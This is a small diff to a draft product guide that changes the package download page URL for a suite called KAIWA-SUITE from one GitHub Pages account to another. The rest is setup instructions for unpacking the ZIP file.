@@ -8,7 +8,7 @@ Product 26.01, version 0.2.0 (draft), 22 November 2026. Not released. Publisher:
 
 ## Get the package
 
-Open the package page https://dpkrpsk-wq.github.io/KAIWA-SUITE/, choose the vendor "Microsoft 365 Copilot" and press the download button. Unpack the ZIP file into a folder of your choice. All paths in this guide start in that folder.
+Open the package page https://mentalping-ops.github.io/KAIWA-SUITE/, choose the vendor "Microsoft 365 Copilot" and press the download button. Unpack the ZIP file into a folder of your choice. All paths in this guide start in that folder.
 
 ## What you need
 
